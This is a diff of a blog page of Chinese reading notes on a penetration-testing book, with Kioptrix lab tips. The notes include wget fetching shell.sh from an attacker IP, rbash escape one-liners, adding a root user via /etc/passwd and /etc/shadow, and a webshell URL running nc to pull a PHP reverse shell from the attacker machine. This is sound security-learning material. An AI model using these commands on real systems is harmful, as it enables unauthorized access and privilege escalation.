@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -258,9 +258,10 @@
 
       
         <p>《脑洞大开：渗透测试另类实战攻略》读书笔记</p>
-<a id="more"></a>
+<span id="more"></span>
 
 <h1 id="第一章：欢迎，年轻的勇士：准备工作"><a href="#第一章：欢迎，年轻的勇士：准备工作" class="headerlink" title="第一章：欢迎，年轻的勇士：准备工作"></a>第一章：欢迎，年轻的勇士：准备工作</h1><h2 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">nmap</span> -sC -sV -v -A 目标主机<span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
+
 <p>其中，-sC、 -sV、 -V、 -A这四个参数的含义如下:</p>
 <ul>
 <li>-sC: 根据端口识别服务自动调用默认脚本，即nmap将根据识别到的具体服务自动使用对<br>应的默认脚本检测服务详情。</li>
@@ -272,30 +273,36 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Kali中此文件所在的路径为</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirbuster/xxxxxx</span><br></pre></td></tr></table></figure>
 
 
+
 <h2 id="文件传输操作"><a href="#文件传输操作" class="headerlink" title="文件传输操作"></a>文件传输操作</h2><p>开http服务</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SinpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
 <p>wget下载</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">10</span>.xxx.xxx.xxx/shell.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="keyword">http</span>://<span class="number">10.</span>xxx.xxx.xxx/<span class="built_in">shell</span>.sh</span><br></pre></td></tr></table></figure>
+
 
 
 <h1 id="第二章：新手村：从Kioptrix开始"><a href="#第二章：新手村：从Kioptrix开始" class="headerlink" title="第二章：新手村：从Kioptrix开始"></a>第二章：新手村：从Kioptrix开始</h1><h2 id="Point-1（80-443）"><a href="#Point-1（80-443）" class="headerlink" title="Point 1（80/443）"></a>Point 1（80/443）</h2><p>对于开放开80和443端口的IP，要分别访问80和443端口</p>
 <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    小贴士:相信有不少人会误以为https服务所提供的站点内容与当前主机http服务所提供的</span><br><span class="line">相同。实际上，在很多情况下，它们所提供的站点内容并不一样，因此在进行渗透测试时应针对</span><br><span class="line">它们分别进行测试。类似地， 一个<span class="built_in">IP</span>下可以运行多个站点，通过<span class="built_in">IP</span>访问和通过域名访问获得的结</span><br><span class="line">果也可能不尽相同，所以应分别留意。</span><br></pre></td></tr></table></figure>
 
 
+
 <h2 id="Point-2（Exploit-Database）"><a href="#Point-2（Exploit-Database）" class="headerlink" title="Point 2（Exploit Database）"></a>Point 2（Exploit Database）</h2><p>过时的中间件、服务版本，可能会存在漏洞，可在Exploit Database进行检索</p>
 <h2 id="Point-3（LinEnum）"><a href="#Point-3（LinEnum）" class="headerlink" title="Point 3（LinEnum）"></a>Point 3（LinEnum）</h2><p>getshell之后可通过linux提权辅助工具LinEnum进行提权</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinEnum 是一个 Linux 主机本地信息自动提取的 shell 脚本，它有超过 <span class="number">65</span> 项安全检查功能，比如潜在的 SUID<span class="regexp">/GUID 文件、Sudo/</span>rhost 错误配置等。</span><br></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinEnum 是一个 Linux 主机本地信息自动提取的 <span class="keyword">shell</span><span class="language-bash"> 脚本，它有超过 65 项安全检查功能，比如潜在的 SUID/GUID 文件、Sudo/rhost 错误配置等。</span></span><br></pre></td></tr></table></figure>
+
 
 
 <h2 id="Point-5（linux写权限）"><a href="#Point-5（linux写权限）" class="headerlink" title="Point 5（linux写权限）"></a>Point 5（linux写权限）</h2><p>提权需要在目标主机本地系统中选择一个我们拥有写权限的目录，<strong>Linux 下常用的相关目录</strong><br><strong>有/tmp/目录以及/dev/shm/目录等</strong></p>
 <h2 id="Point-6（rbash）"><a href="#Point-6（rbash）" class="headerlink" title="Point 6（rbash）"></a>Point 6（rbash）</h2><p>rbash</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小贴士: rbash是一种功能受限的<span class="keyword">bash </span><span class="keyword">shell,即它可以执行的命令被人为限制了，只有特</span></span><br><span class="line"><span class="keyword">定几种，也就是说，rbash是一 </span>种白名单限制<span class="keyword">shell,使用rbash </span>登录的用户只允许使用管理员预</span><br><span class="line">先设定好的命令，可见rbash的权限很低。如果rbash中限定的命令种类设置存在疏忽，就可能</span><br><span class="line">导致恶意攻击者可以利用某些被错误允许执行的命令运行出一个不受限的<span class="keyword">bash </span><span class="keyword">shell,该操作被</span></span><br><span class="line"><span class="keyword">成为rbash逃逸</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小贴士: rbash是一种功能受限的<span class="keyword">bash </span><span class="keyword">shell,即它可以执行的命令被人为限制了，只有特</span></span><br><span class="line"><span class="keyword"></span>定几种，也就是说，rbash是一 种白名单限制<span class="keyword">shell,使用rbash </span>登录的用户只允许使用管理员预</span><br><span class="line">先设定好的命令，可见rbash的权限很低。如果rbash中限定的命令种类设置存在疏忽，就可能</span><br><span class="line">导致恶意攻击者可以利用某些被错误允许执行的命令运行出一个不受限的<span class="keyword">bash </span><span class="keyword">shell,该操作被</span></span><br><span class="line"><span class="keyword"></span>成为rbash逃逸</span><br></pre></td></tr></table></figure>
+
 <p>在rbash中输入“?” ，会获得当前shell允许执行的所有命令列表</p>
 <p><img src="https://img.npfs06.top/20230922161952.png"></p>
 <p>在rbash中，如果遇到了如下常见的命令被允许执行，就可以直接凭借对应的构造命令成功地实现rbash逃逸。换言之，如果想设置一个相对安全的rbash环境，以下命令不应该轻易被允许使用。</p>
 <ul>
 <li>针对<code>ftp</code>、<code>more</code>、<code>less</code>、<code>man</code>、<code>vi</code>、<code>vim</code>，可在输入点输入<code>！/bin/sh</code>或<code>！/bin/bash</code>命令实现逃逸。</li>
-<li><code>awk</code>可以使用<code>awk &#39;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code>或<code>awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>。</li>
+<li><code>awk</code>可以使用<code>awk &#39;BEGIN{system(&quot;/bin/sh&quot;)}&#39;</code>或<code>awk &#39;BEGIN{system(&quot;/bin/bash&quot;)}&#39;</code>。</li>
 <li> <code>find</code>命令可以通过输入<code>find/-name SomeName-exec/bin/sh\；</code>和<code>find/-name SomeName-exec/bin/bash\；</code>实现逃逸。</li>
 <li> Python可以使用<code>python-c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;</code>命令实现逃逸。</li>
 <li> php可以使用<code>php-a then exec(&quot;sh-i&quot;)；</code>命令实现逃逸。</li>
@@ -304,11 +311,13 @@
 <li> ruby可以使用<code>exec&quot;/bin/sh&quot;</code>命令实现逃逸。</li>
 </ul>
 <p>这里只罗列了常见的部分，若想获得更多信息，建议进一步学习如下资料。<br>《Linux Restricted Shell Bypass》：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf%E3%80%82">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf。</a></p>
-<h2 id="Point-7-（sudo）"><a href="#Point-7-（sudo）" class="headerlink" title="Point 7 （sudo）"></a>Point 7 （sudo）</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小贴士: sudo是Linux系统下的管理指令，普通用户可以通过sudo命令以root权限执行管理员设定的几</span><br><span class="line">个或全部程序。设定不同，每个用户被允许使用sudo执行的命令种类和数量也不同。用户可以通过sudo -l命令查看当前用户被允许使用的程序列表。此外，有些用户在使用sudo -l命令的时候也需要提供当前用户的密码，这是因为管理员对用户的设置不同。如果需要密码，那么对于使用反弹<span class="keyword">shell</span><span class="bash">获得的用户身份而言，可能就无法直接查看和使用sudo命令了。</span></span><br></pre></td></tr></table></figure>
+<h2 id="Point-7-（sudo）"><a href="#Point-7-（sudo）" class="headerlink" title="Point 7 （sudo）"></a>Point 7 （sudo）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小贴士: <span class="built_in">sudo</span>是Linux系统下的管理指令，普通用户可以通过<span class="built_in">sudo</span>命令以root权限执行管理员设定的几</span><br><span class="line">个或全部程序。设定不同，每个用户被允许使用<span class="built_in">sudo</span>执行的命令种类和数量也不同。用户可以通过<span class="built_in">sudo</span> -l命令查看当前用户被允许使用的程序列表。此外，有些用户在使用<span class="built_in">sudo</span> -l命令的时候也需要提供当前用户的密码，这是因为管理员对用户的设置不同。如果需要密码，那么对于使用反弹shell获得的用户身份而言，可能就无法直接查看和使用<span class="built_in">sudo</span>命令了。</span><br></pre></td></tr></table></figure>
+
 <h2 id="Point-8-改用户提权"><a href="#Point-8-改用户提权" class="headerlink" title="Point 8 (改用户提权)"></a>Point 8 (改用户提权)</h2><p>拥有修改敏感文件的权限时（比如sudo ht），我们可以直接在<code>/etc/passwd</code>文件中新增用户，并且把密码直接写在/etc/passwd文件里。</p>
 <p>例如：<br><img src="https://img.npfs06.top/20230922155015.png"></p>
 <p>上述内容将创建一个用户名为rootwe,密码为toor的root用户。文中密码toor的密文sXuCKi7k3Xh/s是通过如下命令获得的:</p>
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">openssl passwd -crypt toor</span></span><br></pre></td></tr></table></figure>
+
 <p>也可以编辑<code>/etc/shadow</code>文件，将root账号的密码清空，保存退出后，然后执行su root命令即可无须密码切换到root用户</p>
 <p><img src="https://img.npfs06.top/20230922160336.png"></p>
 <p>也可以编辑<code>/etc/sudoers</code>文件，该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围，即执行sudo -l命令时获得的输出结果。可以直接修改该文件给当前的低权限用户添加无须使用密码执行sudo /bash命令的权限。</p>
@@ -317,18 +326,21 @@
 <p><img src="https://img.npfs06.top/20230922164722.png"></p>
 <p>而如果在Kali系统中换一个端口开启SimpleHTTPServer，则可以成功绕过上述连接限制。本例中使用如下命令将SimpleHTTPServer改在8882端口开放。</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SinpleHTTPServer <span class="number">8882</span></span><br></pre></td></tr></table></figure>
+
 <p>之后在目标主机系统上使用wget命令访问Kali系统的8882端口下载文件，就不会再受连接限制影响了</p>
 <p><img src="https://img.npfs06.top/20230922164817.png"></p>
 <h2 id="Point-11-Apache的默认安装路径"><a href="#Point-11-Apache的默认安装路径" class="headerlink" title="Point 11 (Apache的默认安装路径)"></a>Point 11 (Apache的默认安装路径)</h2><p>Apache官方提供了一个名为DistrosDefaultLayout的站点，链接如下：</p>
 <p><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout%E3%80%82">https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout。</a><br>上述站点提供了Linux各版本系统下Apache的默认安装路径</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当<span class="keyword">nmap</span>扫描出来的某端口无法访问时，如果条件允许，可以通过Apache中间件的主配置文件httpd.<span class="keyword">conf</span>来查找原因。比如存在目录穿越漏洞时，可通过上诉网站查找路径后配合漏洞进行读取</span><br></pre></td></tr></table></figure>
+
 <h2 id="Point-12-（nc传输文件）"><a href="#Point-12-（nc传输文件）" class="headerlink" title="Point 12 （nc传输文件）"></a>Point 12 （nc传输文件）</h2><p>Kali系统自带shell文件php_reverse_shell.php，它默认位于<code>/usr/share/webshells/php</code>目录。使用该文件时，首先要将其内部的反弹IP和端口更改为目前Kali系统实际使用的IP以及准备监听反弹shell的端口。</p>
 <p><strong>使用nc传输文件</strong></p>
 <p>攻击机：192.168.192.134<br>目标机器：192.168.192.135</p>
 <p>当目标机器存在远程命令执行漏洞，但发现该目标主机系统限制使用nc的-e命令参数，这导致远程连接无法交互，输入任何命令都会直接断开连接。此外，由于目标主机本地没有bash、Python等程序，因此也导致相关反弹shell方法均不可用。这时使用文件写入方法，利用echo命令写入“一句Webshell”，获得一个可以回显的远程命令执行方式。</p>
 <p><strong>虽然目标主机对nc -e命令进行了限制，但nc传输文件时无须使用-e参数。因此可以借助“一句话Webshell”使用nc上传shell文件。具体操作如下：</strong></p>
 <p>1、利用“一句话Webshell”构建如下链接：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">192.135</span>:<span class="number">8080</span><span class="regexp">/phptax/</span>shell.php?cmd=nc <span class="number">192.168</span>.<span class="number">192.134</span> <span class="number">8888</span> &gt;reverse_shell.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.192.135:8080</span>/phptax/shell.php?cmd=nc <span class="number">192.168.192.134</span> <span class="number">8888</span> &gt;reverse_shell.php</span><br></pre></td></tr></table></figure>
+
 <p>该链接中包含的命令将通过nc向192.168.192.134主机的8888端口发起连接请求，并且会将获得的返回数据保存为本地reverse_shell.php。访问上述链接前，在Kali系统的php_reverse_shell.php文件所在的目录下执行如下命令：</p>
 <p><img src="https://img.npfs06.top/20230922172510.png"></p>
 <p>该命令将通过nc监听8888端口。当该端口被访问时，nc会将本地php_reverse_shell.php的文件内容提供给对方。通过在Kali系统以及目标主机分别完成上述操作，就可以成功使用nc实现文件传输，最终的传输结果将保存在目标主机Web目录的reverse_shell.php中。<br>完成上述操作后，使用nc命令重新监听8888端口。</p>
@@ -449,7 +461,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -513,7 +525,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
